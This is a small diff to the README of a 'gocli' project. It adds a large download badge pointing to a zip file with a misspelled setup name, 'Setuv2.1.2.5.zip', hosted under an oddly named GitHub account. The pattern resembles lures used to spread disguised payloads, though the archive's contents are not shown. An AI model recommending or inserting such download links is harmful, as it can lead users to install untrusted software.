@@ -1,3 +1,5 @@
+[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/dmitry-miller-hq1999h8/gocli/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ gocli
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
